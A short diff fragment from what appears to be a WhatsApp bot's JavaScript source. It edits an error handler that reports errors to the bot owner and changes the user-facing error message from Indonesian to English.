@@ -12753,11 +13517,11 @@ if (stdout) return joreply(`${stdout}`)
 } catch (err) {
 peki = async () => {
 ryozingod.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
-await sleep(1000)
+new Promise(resolve => setTimeout(resolve, 2000))
 m.reply(`
-❌ Eror Ditemukan. Eror Succes Dilaporkan Ke Contributor Bot, Mohon Tunggu Beberapa Waktu Sampai Owner Memperbaiki Eror Tersebut ✅
+!Eror, error details will be sent to bot contributors ✓
 
-${util.format(err)}`)
+\`\`\`${util.format(err)}\`\`\``)
 console.log(util.format(err))
 }
 peki()
